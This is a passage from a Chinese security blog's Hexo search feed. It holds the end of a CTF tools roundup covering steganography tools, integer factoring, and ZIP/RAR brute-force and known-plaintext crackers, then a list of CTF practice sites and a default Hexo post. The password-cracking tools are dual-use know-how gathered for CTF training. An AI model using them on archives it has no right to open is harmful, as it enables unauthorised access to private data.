<h2 id="wbs43open"><a href="#wbs43open" class="headerlink" title="wbs43open"></a><a href="#wbs43open"></a>wbs43open</h2><p><code>PDF</code>文件隐写的不二选择 <a href="https://yunpan.cn/c6jcYbgFjajmp" target="_blank" rel="external">下载传送门</a> （提取码：2336）<br><a href="http://oayoilchh.bkt.clouddn.com/2016/07/27/16:53:39%20" target="_blank" rel="external"><img src="http://oayoilchh.bkt.clouddn.com/2016/07/27/16:53:39%20" alt=""></a></p>
<h2 id="Iamge-Stganograpy"><a href="#Iamge-Stganograpy" class="headerlink" title="Iamge Stganograpy"></a><a href="#Iamge-Stganograpy"></a>Iamge Stganograpy</h2><p>这也是一个图片的隐写工具<br>当初死活在谷歌 百度等地方都找不到 最后<code>白师傅</code>在搜狗找到了…<br><a href="http://imagesteganography.codeplex.com/" target="_blank" rel="external">下载传送门</a></p>
<h2 id="F5算法隐写实现"><a href="#F5算法隐写实现" class="headerlink" title="F5算法隐写实现"></a><a href="#F5算法隐写实现"></a>F5算法隐写实现</h2><p><a href="https://yunpan.cn/c6jdvEtep8guk" target="_blank" rel="external">下载传送门</a> （提取码：c033)</p>
<h2 id="silenteye-音频隐写）"><a href="#silenteye-音频隐写）" class="headerlink" title="silenteye(音频隐写）"></a><a href="#silenteye-音频隐写）"></a>silenteye(音频隐写）</h2><p><a href="http://oayoilchh.bkt.clouddn.com/2016/07/27/17:13:24%20" target="_blank" rel="external"><img src="http://oayoilchh.bkt.clouddn.com/2016/07/27/17:13:24%20" alt=""></a></p>
<h2 id="MP3Stego"><a href="#MP3Stego" class="headerlink" title="MP3Stego"></a><a href="#MP3Stego"></a>MP3Stego</h2><p>顾名思义 这是一个款音频隐写工具<a href="http://www.petitcolas.net/steganography/mp3stego/" target="_blank" rel="external">下载传送门</a></p>
<figure class="highlight tp"><table><tbody><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">用MP3Stego进行加密解密：</div><div class="line"></div><div class="line">加密：encode -E 加密文本 -<span class="keyword">P</span> 密码  mp<span class="number">3</span>文件</div><div class="line"></div><div class="line">解密：decode -<span class="keyword">X</span> -<span class="keyword">P</span>  密码  mp<span class="number">3</span>文件</div></pre></td></tr></tbody></table></figure>

<h2 id="Outguess"><a href="#Outguess" class="headerlink" title="Outguess"></a><a href="#Outguess"></a>Outguess</h2><p>2016-08-04 21:07:46<br>今天遇到的一个隐写工具 CSDN有源码</p>
<figure class="highlight plain"><figcaption><span>code</span></figcaption><table><tbody><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./configure &amp;&amp; make &amp;&amp; make install</div></pre></td></tr></tbody></table></figure>

<p>使用方法<code>outguess</code>就能看到使用方法啦</p>
<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">outguess -r bystudent.jpg outfile.txt</div></pre></td></tr></tbody></table></figure>

<p><strong>这个隐写方式也是可以通过stegdetect</strong>检测出来的</p>
<h1 id="Other"><a href="#Other" class="headerlink" title="Other"></a><a href="#Other"></a>Other</h1><h2 id="Yafu"><a href="#Yafu" class="headerlink" title="Yafu"></a><a href="#Yafu"></a>Yafu</h2><p>大整数分解 <a href="https://yunpan.cn/c6jHKGCbiwEPJ" target="_blank" rel="external">下载传送门</a>（提取码：16f4）<br><a href="http://oayoilchh.bkt.clouddn.com/2016/07/27/17:19:36%20" target="_blank" rel="external"><img src="http://oayoilchh.bkt.clouddn.com/2016/07/27/17:19:36%20" alt=""></a></p>
<figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="title">factor</span><span class="params">(要分解的整数)</span></span></div></pre></td></tr></tbody></table></figure>

<h2 id="Ziperello"><a href="#Ziperello" class="headerlink" title="Ziperello"></a><a href="#Ziperello"></a>Ziperello</h2><p><code>ZIP</code>压缩包暴力破解 <a href="https://yunpan.cn/c6jFbIaYXFQxw" target="_blank" rel="external">下载传送门</a>（提取码：324a)<br><a href="http://oayoilchh.bkt.clouddn.com/2016/07/27/17:43:00%20" target="_blank" rel="external"><img src="http://oayoilchh.bkt.clouddn.com/2016/07/27/17:43:00%20" alt=""></a></p>
<h2 id="ARPR-ha"><a href="#ARPR-ha" class="headerlink" title="ARPR-ha"></a><a href="#ARPR-ha"></a>ARPR-ha</h2><p><code>RAR</code>暴力破解 <a href="https://yunpan.cn/c6jFCzLhVDGbX" target="_blank" rel="external">下载传送门</a> （提取码：6092）</p>
<h2 id="AAPasswordRecovery"><a href="#AAPasswordRecovery" class="headerlink" title="AAPasswordRecovery"></a><a href="#AAPasswordRecovery"></a>AAPasswordRecovery</h2><p>ZIP /RAR等压缩软件的破解工具 <a href="https://yunpan.cn/c6jL27k6Nvfvc" target="_blank" rel="external"></a> （提取码：f6c7)<br>可支持多种破解方式<br>包括</p>
<p><ol></ol></p>
<p><li>明文攻击</li></p>
<p><li>暴力破解</li></p>
<p><li>字典攻击<br><a href="http://oayoilchh.bkt.clouddn.com/2016/07/27/17:49:27%20" target="_blank" rel="external"><img src="http://oayoilchh.bkt.clouddn.com/2016/07/27/17:49:27%20" alt=""></a></li></p>
<h2 id="PKCrack"><a href="#PKCrack" class="headerlink" title="PKCrack"></a><a href="#PKCrack"></a>PKCrack</h2><p><code>ZIP</code>明文破解工具 <a href="http://www.unix-ag.uni-kl.de/~conrad/krypto/pkcrack.html" target="_blank" rel="external">下载传送门</a><br><a href="http://blog.csdn.net/jiangwlee/article/details/6911087" target="_blank" rel="external">详细使用方法请看这</a></p>
<h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a><a href="#最后"></a>最后</h1><p><a href="http://www.codefrom.com/c/43" target="_blank" rel="external"><code>CTF常用工具集合</code></a><br><a href="https://www.hackfun.org/CTF/coding-and-encryption-of-those-brain-holes-in-CTF.html" target="_blank" rel="external"><code>表哥的编码解码博文</code></a><br><a href="http://bobao.360.cn/learning/detail/243.html" target="_blank" rel="external"><code>CTF隐写总结</code></a></p>
<ul>
<li>转载自<a href="http://www.wing3.cn" target="_blank" rel="external">Swing’s Blog</a>文章<a href="http://www.wing3.cn/2016/04/25/tools/" target="_blank" rel="external">《工具以及脚本的整理》</a></li>
</ul>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[入CTF坑必不可少的地方]]></title>
      <url>http://uknowsec.cn/posts/ctf/%E5%85%A5CTF%E5%9D%91%E5%BF%85%E4%B8%8D%E5%8F%AF%E5%B0%91%E7%9A%84%E5%9C%B0%E6%96%B9.html</url>
      <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E5%9B%BE%E7%89%8720161004230538.jpg" alt="ctf"><br><strong>0x00 前言</strong></p>
<p>没有交易，没有买卖，没有排名，纯属分享</p>
<p><strong>0x01 CTF介绍</strong></p>
<ul>
<li><a href="http://blog.idf.cn/2015/02/ctf-field-guide/" target="_blank" rel="external">CTF领域指南</a></li>
<li><a href="http://tieba.baidu.com/p/3933947157" target="_blank" rel="external">CTF介绍大全</a></li>
<li><a href="https://ctftime.org/event/list/upcoming" target="_blank" rel="external">CTF赛事预告</a></li>
</ul>
<p><strong>0x02 CTF练习</strong></p>
<ul>
<li><strong>BIN:</strong></li>
<li><a href="http://reversing.kr/" target="_blank" rel="external">reversing</a></li>
<li><a href="http://pwnable.kr/" target="_blank" rel="external">pwnable</a></li>
<li><a href="http://crackmes.de/" target="_blank" rel="external">crackmes</a></li>
<li><a href="http://exploit-exercises.com/" target="_blank" rel="external">exploit-exercises</a></li>
<li><a href="http://overthewire.org/" target="_blank" rel="external">overthewire</a></li>
<li><a href="https://io.netgarage.org" target="_blank" rel="external">netgarage</a></li>
<li><a href="http://security.cs.rpi.edu/courses/binexp-spring2015/" target="_blank" rel="external">bin干货</a></li>
<li><a href="http://www.52pojie.cn/forum-67-1.html" target="_blank" rel="external">2014CrackMe大赛</a></li>
<li><a href="http://www.52pojie.cn/forum-71-1.html" target="_blank" rel="external">吾爱破解2016安全挑战赛</a></li>
<li><p><a href="http://bbs.pediy.com/forumdisplay.php?f=109" target="_blank" rel="external">看雪安全论坛历年安全大赛</a></p>
</li>
<li><p><strong> SQL:</strong></p>
</li>
<li><a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="external">sqli-labs</a></li>
<li><p><a href="http://redtiger.labs.overthewire.org/" target="_blank" rel="external">RedTigers Hackit</a></p>
</li>
<li><p><strong>XSS:</strong></p>
</li>
<li><a href="http://xss.pkav.net/xss/" target="_blank" rel="external">乌云XSS互动学习平台</a></li>
<li><a href="http://prompt.ml/" target="_blank" rel="external">prompt</a></li>
<li><a href="http://xss-quiz.int21h.jp/http://escape.alf.nu/" target="_blank" rel="external">XSS Challenges</a></li>
<li><a href="http://escape.alf.nu/" target="_blank" rel="external">escape</a></li>
<li><p><a href="https://xss-game.appspot.com/" target="_blank" rel="external">xss-game</a></p>
</li>
<li><p><strong>国内综合练习：</strong></p>
</li>
<li><a href="http://www.sangebaimao.com/challenge/list" target="_blank" rel="external">三个白帽</a></li>
<li><a href="http://hackinglab.cn/" target="_blank" rel="external">网络信息安全攻防学习平台</a></li>
<li><a href="http://captf.com/" target="_blank" rel="external">CTF题目</a></li>
<li><a href="http://cafebabe.cc/nazo/" target="_blank" rel="external">脑洞开发</a></li>
<li><a href="http://1111.segmentfault.com/" target="_blank" rel="external">光棍节程序员闯关秀</a></li>
<li><a href="http://www.helloisa.com/test/" target="_blank" rel="external">ISA Test</a></li>
<li><a href="http://www.fj543.com/hack/" target="_blank" rel="external">黑客丛林之旅</a></li>
<li><a href="http://monyer.com/game/game1/" target="_blank" rel="external">梦之光芒小游戏</a></li>
<li><a href="http://oj.xctf.org.cn/" target="_blank" rel="external">XCTF_OJ练习平台</a></li>
<li><a href="http://hackgame.blackbap.org/" target="_blank" rel="external">习科黑客游戏</a></li>
<li><a href="http://ctf.3sec.cn/" target="_blank" rel="external">Jlu.CTF</a></li>
<li><a href="http://www.baimaoxueyuan.com/ctf" target="_blank" rel="external">白帽学院CTF挑战赛</a></li>
<li><a href="http://www.ichunqiu.com/tiaozhans" target="_blank" rel="external">i春秋CTF挑战</a></li>
<li><a href="http://ctf.idf.cn/" target="_blank" rel="external">idf 实验室</a></li>
<li><a href="http://ctf.moonsos.com/pentest/index.php" target="_blank" rel="external">米安CTF</a></li>
<li><a href="http://www.hetianlab.com/CTFrace.html" target="_blank" rel="external">合天CTF</a></li>
<li><a href="http://www.shiyanbar.com/ctf/index" target="_blank" rel="external">西普CTF</a></li>
<li><a href="http://hkyx.myhack58.com/" target="_blank" rel="external">红客闯关游戏</a></li>
<li><a href="http://202.108.211.5/" target="_blank" rel="external">实训竞赛系统</a></li>
<li><p><a href="http://ctf.nuptsast.com/" target="_blank" rel="external">南邮CTF</a></p>
</li>
<li><p><strong>国外综合练习:</strong></p>
</li>
<li><a href="http://www.wechall.net/" target="_blank" rel="external">wechall</a></li>
<li><a href="http://insight-labs.org/" target="_blank" rel="external">insight-labs</a></li>
<li><a href="http://webhacking.kr/" target="_blank" rel="external">webhacking</a></li>
<li><a href="http://wargame.kr/" target="_blank" rel="external">wargame</a></li>
<li><a href="http://canyouhack.it/" target="_blank" rel="external">canyouhack</a></li>
<li><a href="http://hackit.sinaapp.com/" target="_blank" rel="external">hackit</a></li>
<li><a href="http://webhacking.kr/" target="_blank" rel="external">webhacking</a></li>
<li><a href="http://fun.coolshell.cn/" target="_blank" rel="external">coolshell</a></li>
<li><a href="http://ringzer0team.com/challenge" target="_blank" rel="external">ringzer0team</a></li>
<li><a href="https://backdoor.sdslabs.co/" target="_blank" rel="external">backdoor</a></li>
<li><a href="http://smashthestack.org/" target="_blank" rel="external">smashthestack</a></li>
<li><a href="http://overthewire.org/wargames/" target="_blank" rel="external">overthewire</a></li>
<li><a href="https://w3challs.com/" target="_blank" rel="external">w3challs</a></li>
<li><a href="https://chall.stypr.com/?chall" target="_blank" rel="external">chall.stypr</a></li>
<li><a href="https://pentesterlab.com/" target="_blank" rel="external">pentesterlab</a></li>
<li><a href="https://id0-rsa.pub" target="_blank" rel="external">id0-rsa</a></li>
</ul>
<p><strong>0x03 CTF-writeup(WP):</strong></p>
<ul>
<li><strong>各种搜索:ctf writeup</strong></li>
<li><a href="http://drops.wooyun.org/?s=writeup&amp;submit=%E6%90%9C%E7%B4%A2" target="_blank" rel="external">乌云WP</a></li>
<li><a href="http://bobao.360.cn/ctf/" target="_blank" rel="external">360安全播报WP</a></li>
<li><a href="https://github.com/ctfs/" target="_blank" rel="external">github WP</a></li>
<li><a href="http://sec.yka.me/" target="_blank" rel="external">CTF Writeup Summary</a></li>
<li><a href="https://ctf-team.vulnhub.com/" target="_blank" rel="external">Write Ups</a></li>
</ul>
<p><strong>0x04 后话</strong></p>
<ul>
<li><p>学习的地方很多，不能一一列举，一些其他优秀的平台没有提到，欢迎大家补充</p>
</li>
<li><p>转载自<a href="https://www.hackfun.org/" target="_blank" rel="external">4ido10n’s Blog</a>文章<a href="https://www.hackfun.org/CTF/ctf-website.html" target="_blank" rel="external">《入CTF坑必不可少的地方-保持更新》</a></p>
</li>
</ul>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Hello World]]></title>
      <url>http://uknowsec.cn/posts/uncategorized/hello-world.html</url>
      <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="external">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="external">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="external">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="external">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo new <span class="string">"My New Post"</span></div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="external">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo server</div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="external">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo generate</div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="external">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo deploy</div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="external">Deployment</a></p>
]]></content>
    </entry>
    
  
  
</search>
